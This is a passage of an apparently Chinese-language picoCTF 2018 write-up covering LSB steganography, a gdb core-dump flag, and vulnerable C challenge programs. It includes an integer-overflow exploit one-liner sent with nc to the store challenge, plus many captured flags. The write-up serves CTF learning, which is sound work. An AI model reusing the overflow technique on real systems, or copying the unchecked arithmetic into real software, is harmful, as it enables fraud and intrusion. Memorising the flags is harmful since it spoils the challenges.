class="line">Great job. You<span class="string">'ve earned the flag: picoCTF&#123;w4y_0ut_0915ebc6&#125;</span></span><br></pre></td></tr></table></figure>
+<h2 id="LoadSomeBits"><a href="#LoadSomeBits" class="headerlink" title="LoadSomeBits"></a>LoadSomeBits</h2><p>最低有效位隐写，需要fuzz起始偏移。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat lsb.py</span></span><br><span class="line">import binascii</span><br><span class="line">lsb=<span class="string">''</span>.join(map(lambda x:str(ord(x)&amp;1),open(<span class="string">'pico2018-special-logo.bmp'</span>,<span class="string">'rb'</span>).<span class="built_in">read</span>()))</span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> range(16):</span><br><span class="line">        tmp=lsb[offset:]</span><br><span class="line">        tmps=<span class="string">''</span>.join(chr(int(tmp[i:i+8],2)) <span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(tmp),8))</span><br><span class="line">        <span class="keyword">if</span>  <span class="string">'pico'</span> <span class="keyword">in</span> tmps:</span><br><span class="line">                <span class="built_in">print</span> tmps</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python lsb.py | strings | grep -o picoCTF&#123;.*&#125;</span></span><br><span class="line">picoCTF&#123;st0r3d_iN_tH3_l345t_s1gn1f1c4nT_b1t5_2903593693&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="core"><a href="#core" class="headerlink" title="core"></a>core</h2><p>core file或者core dunp是一个保存进程运行时内存镜像和进程状态（如寄存器的值等）的文件。没挂调试器的程序崩溃时一般会自动产生core文件用于post-mortem debugging。可以使用 <code>gdb  program [core dump]</code> 开始调试。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x080487ec &lt;+0&gt;:     lea    ecx,[esp+0x4]</span><br><span class="line">   0x080487f0 &lt;+4&gt;:     and    esp,0xfffffff0</span><br><span class="line">   0x080487f3 &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x080487f6 &lt;+10&gt;:    push   ebp</span><br><span class="line">   0x080487f7 &lt;+11&gt;:    mov    ebp,esp</span><br><span class="line">   0x080487f9 &lt;+13&gt;:    push   ecx</span><br><span class="line">   0x080487fa &lt;+14&gt;:    sub    esp,0x4</span><br><span class="line">   0x080487fd &lt;+17&gt;:    call   0x80485bb &lt;load_strings&gt;</span><br><span class="line">   0x08048802 &lt;+22&gt;:    call   0x80487c1 &lt;print_flag&gt;</span><br><span class="line">   0x08048807 &lt;+27&gt;:    mov    eax,0x0</span><br><span class="line">   0x0804880c &lt;+32&gt;:    add    esp,0x4</span><br><span class="line">   0x0804880f &lt;+35&gt;:    pop    ecx</span><br><span class="line">   0x08048810 &lt;+36&gt;:    pop    ebp</span><br><span class="line">   0x08048811 &lt;+37&gt;:    lea    esp,[ecx-0x4]</span><br><span class="line">   0x08048814 &lt;+40&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disas print_flag</span><br><span class="line">Dump of assembler code for function print_flag:</span><br><span class="line">=&gt; 0x080487c1 &lt;+0&gt;:     push   ebp</span><br><span class="line">   0x080487c2 &lt;+1&gt;:     mov    ebp,esp</span><br><span class="line">   0x080487c4 &lt;+3&gt;:     sub    esp,0x18</span><br><span class="line">   0x080487c7 &lt;+6&gt;:     mov    DWORD PTR [ebp-0xc],0x539</span><br><span class="line">   0x080487ce &lt;+13&gt;:    mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x080487d1 &lt;+16&gt;:    mov    eax,DWORD PTR [eax*4+0x804a080]</span><br><span class="line">   0x080487d8 &lt;+23&gt;:    sub    esp,0x8</span><br><span class="line">   0x080487db &lt;+26&gt;:    push   eax ;flag字符串的地址保存在eax中</span><br><span class="line">   0x080487dc &lt;+27&gt;:    push   0x804894c</span><br><span class="line">   0x080487e1 &lt;+32&gt;:    call   0x8048410 &lt;printf@plt&gt;</span><br><span class="line">   0x080487e6 &lt;+37&gt;:    add    esp,0x10</span><br><span class="line">   0x080487e9 &lt;+40&gt;:    nop</span><br><span class="line">   0x080487ea &lt;+41&gt;:    leave</span><br><span class="line">   0x080487eb &lt;+42&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) x/sb *(0x804a080+4*0x539)</span><br><span class="line">0x80610f0:      &quot;c96bd0fa2da5c0853cf12c4f93fce288&quot;s</span><br></pre></td></tr></table></figure>
+<p><code>picoCTF{c96bd0fa2da5c0853cf12c4f93fce288}</code>每个人的答案是不同的。</p>
+<h1 id="General-Skills"><a href="#General-Skills" class="headerlink" title="General Skills"></a>General Skills</h1><h2 id="absolutely-relative"><a href="#absolutely-relative" class="headerlink" title="absolutely relative"></a>absolutely relative</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> yes_len 3</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *yes = <span class="string">"yes"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">99</span>];</span><br><span class="line">    <span class="keyword">char</span> permission[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    FILE * file;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    file = fopen(<span class="string">"/problems/absolutely-relative_2_69862edfe341b57b6ed2c62c7107daee/flag.txt"</span> , <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (file) &#123;</span><br><span class="line">    	<span class="keyword">while</span> (<span class="built_in">fscanf</span>(file, <span class="string">"%s"</span>, flag)!=EOF)</span><br><span class="line">    	fclose(file);</span><br><span class="line">    &#125;   </span><br><span class="line">	</span><br><span class="line">    file = fopen( <span class="string">"./permission.txt"</span> , <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (file) &#123;</span><br><span class="line">    	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">            <span class="built_in">fscanf</span>(file, <span class="string">"%s"</span>, permission);</span><br><span class="line">        &#125;</span><br><span class="line">        permission[<span class="number">5</span>] = <span class="string">'\0'</span>;</span><br><span class="line">        fclose(file);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(permission, yes, yes_len)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"You have the write permissions.\n%s\n"</span>, flag);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"You do not have sufficient permissions to view the flag.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="1539439034675.png" alt="1539439034675"></p>
+<p><code>picoCTF{3v3r1ng_1$_r3l3t1v3_372b3859}</code> </p>
+<h2 id="Aca-Shell-A"><a href="#Aca-Shell-A" class="headerlink" title="Aca-Shell-A"></a>Aca-Shell-A</h2><p><img src="1539139814957.png" alt="1539139814957"></p>
+<p><img src="1539139848050.png" alt="1539139848050"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;CrUsHeD_It_17ab99f5&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="in-out-error"><a href="#in-out-error" class="headerlink" title="in out error"></a>in out error</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"Please may I have the flag?"</span> | ./<span class="keyword">in</span>-out-error  &gt; ~/result.txt</span><br><span class="line"><span class="comment">#picoCTF&#123;p1p1ng_1S_4_7h1ng_f37fb67e&#125;</span></span><br></pre></td></tr></table></figure>
+<h2 id="learn-gdb"><a href="#learn-gdb" class="headerlink" title="learn gdb"></a>learn gdb</h2><p><code>picoCTF{gDb_iS_sUp3r_u53fuL_f3f39814}</code> </p>
+<p><img src="1538828295272.png" alt="1538828295272"></p>
+<h2 id="store"><a href="#store" class="headerlink" title="store"></a>store</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="meta"># curl https:<span class="comment">//2018shell2.picoctf.com/static/655fb38d2f256165a0163d4a606f998a/source.c</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> con;</span><br><span class="line">    con = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> account_balance = <span class="number">1100</span>;</span><br><span class="line">    <span class="keyword">while</span>(con == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to the Store App V1.0\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"World's Most Secure Purchasing App\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n[1] Check Account Balance\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n[2] Buy Stuff\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n[3] Exit\n"</span>);</span><br><span class="line">        <span class="keyword">int</span> menu;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n Enter a menu selection\n"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdin</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;menu);</span><br><span class="line">        <span class="keyword">if</span>(menu == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\n\n Balance: %d \n\n\n"</span>, account_balance);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(menu == <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Current Auctions\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[1] I Can't Believe its not a Flag!\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[2] Real Flag\n"</span>);</span><br><span class="line">            <span class="keyword">int</span> auction_choice;</span><br><span class="line">            fflush(<span class="built_in">stdin</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;auction_choice);</span><br><span class="line">            <span class="keyword">if</span>(auction_choice == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Imitation Flags cost 1000 each, how many would you like?\n"</span>);</span><br><span class="line">                <span class="keyword">int</span> number_flags = <span class="number">0</span>;</span><br><span class="line">                fflush(<span class="built_in">stdin</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;number_flags);</span><br><span class="line">                <span class="keyword">if</span>(number_flags &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">int</span> total_cost = <span class="number">0</span>;</span><br><span class="line">                    total_cost = <span class="number">1000</span>*number_flags;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"\nYour total cost is: %d\n"</span>, total_cost);</span><br><span class="line">                    <span class="keyword">if</span>(total_cost &lt;= account_balance)&#123;</span><br><span class="line">                        account_balance = account_balance - total_cost;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"\nYour new balance: %d\n\n"</span>, account_balance);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"Not enough funds\n"</span>);</span><br><span class="line">                    &#125;   </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(auction_choice == <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"A genuine Flag costs 100000 dollars, and we only have 1 in stock\n"</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Enter 1 to purchase"</span>);</span><br><span class="line">                <span class="keyword">int</span> bid = <span class="number">0</span>;</span><br><span class="line">                fflush(<span class="built_in">stdin</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;bid);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(bid == <span class="number">1</span>)&#123;                </span><br><span class="line">                    <span class="keyword">if</span>(account_balance &gt; <span class="number">100000</span>)&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"YOUR FLAG IS:\n"</span>);</span><br><span class="line">                        &#125;                 </span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"\nNot enough funds for transaction\n\n\n"</span>);</span><br><span class="line">                    &#125;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            con = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>整数溢出。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'print "2\n1\n"+str(((1100-100001)+2**32)/1000)+"\n2\n2\n1\n3\n"'</span> | nc 2018shell2.picoctf.com 43581 | grep pico</span><br><span class="line"><span class="comment"># Enter 1 to purchaseYOUR FLAG IS: picoCTF&#123;numb3r3_4r3nt_s4f3_6bd13a8c&#125;</span></span><br></pre></td></tr></table></figure>
+<h2 id="roulette"><a href="#roulette" class="headerlink" title="roulette"></a>roulette</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_NUM_LEN 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HOTSTREAK 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_WINS 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ONE_BILLION 1000000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROULETTE_SIZE 36</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROULETTE_SPINS 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROULETTE_SLOWS 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_WIN_MSGS 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_LOSE_MSGS 5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> cash = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">long</span> wins = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//判断字符是否是数字,是则返回真。</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">is_digit</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0'</span> &lt;= c &amp;&amp; c &lt;= <span class="string">'9'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//从stdin获取一个长整型正数，最大为LONG_MAX，以换行结尾。</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_long</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> l = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(!is_digit(c))</span><br><span class="line">      c = getchar();</span><br><span class="line">    <span class="keyword">while</span>(is_digit(c)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(l &gt;= LONG_MAX) &#123;</span><br><span class="line">	l = LONG_MAX;</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      l *= <span class="number">10</span>;</span><br><span class="line">      l += c - <span class="string">'0'</span>;</span><br><span class="line">      c = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(c != <span class="string">'\n'</span>)</span><br><span class="line">      c = getchar();</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//随机返回一个小于5000的正整数</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_rand</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">long</span> seed;</span><br><span class="line">  FILE *f = fopen(<span class="string">"/dev/urandom"</span>, <span class="string">"r"</span>);</span><br><span class="line">  fread(&amp;seed, <span class="keyword">sizeof</span>(seed), <span class="number">1</span>, f);</span><br><span class="line">  fclose(f);</span><br><span class="line">  seed = seed % <span class="number">5000</span>;</span><br><span class="line">  <span class="keyword">if</span> (seed &lt; <span class="number">0</span>) seed = seed * <span class="number">-1</span>;</span><br><span class="line">  srand(seed);</span><br><span class="line">  <span class="keyword">return</span> seed;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印当前资金和获胜次数，下注。（输入点一）</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_bet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"How much will you wager?"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Current Balance: $%lu \t Current Wins: %lu\n"</span>, cash, wins); </span><br><span class="line">    <span class="keyword">long</span> bet = get_long(); </span><br><span class="line">    <span class="keyword">if</span>(bet &lt;= cash) &#123;</span><br><span class="line">      <span class="keyword">return</span> bet;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You can't bet more than you have!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//选择下注目标1~36.（输入点二）</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_choice</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Choose a number (1-%d)\n"</span>, ROULETTE_SIZE);</span><br><span class="line">    <span class="keyword">long</span> choice = get_long();</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> &lt;= choice &amp;&amp; choice &lt;= ROULETTE_SIZE) &#123;</span><br><span class="line">      <span class="keyword">return</span> choice;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Please enter a valid choice."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印flag</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">print_flag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">48</span>];</span><br><span class="line">  FILE *file;</span><br><span class="line">  file = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to open the flag file\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag, <span class="keyword">sizeof</span>(flag), file);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, flag);</span><br><span class="line">  <span 